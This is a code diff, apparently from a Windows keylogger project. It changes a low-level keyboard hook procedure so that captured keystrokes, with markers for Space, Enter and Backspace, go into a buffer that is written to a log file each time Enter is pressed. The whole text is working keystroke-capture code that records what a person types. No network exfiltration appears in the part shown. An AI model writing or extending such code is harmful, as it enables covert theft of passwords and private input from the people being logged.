@@ -35,22 +35,31 @@ LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam)
         switch(pkey->vkCode)
         {
             case VK_SPACE:
-                kCode = pkey->vkCode;
-                printf("[SPACE]");
+                input_add_string("[SPACE]");
                 break ;
             case VK_RETURN:
-                kCode = pkey->vkCode;
-                printf("[ENTER]");
+                input_add_string("[ENTER]\\n\n");
+                DBG("buffer = %s\n", input_get_buffer());
+                WriteLogs(input_get_buffer());
+                input_clean_buffer();
                 break ;
             case VK_BACK:
-                kCode = pkey->vkCode;
-                printf("[BACKSPACE]");
+                input_add_string("[BACKSPACE]");
                 break ;
             default:
                 kCode = pkey->vkCode;
                 printf("%c", (char)pkey->vkCode);
                 //DBG("OOHH\n");
-                WriteLogs(pkey->vkCode);
+                
+                /*BYTE keyboard_status[256];
+                WCHAR unicode_buff[8] = {0}; 
+                int unicode = ToUnicode(pkey->vkCode, pkey->scanCode, keyboard_status, unicode_buff, 8, 0);
+                DBG("Unicde: %d\n", unicode);
+                DBG_unicode(L"%lc", unicode_buff[0]);*/
+
+                input_add_key((char)pkey->vkCode);
+                DBG("buffer = %s\n", input_get_buffer());
+                //WriteLogs(input_get_buffer());
                 break ;
         }
     }
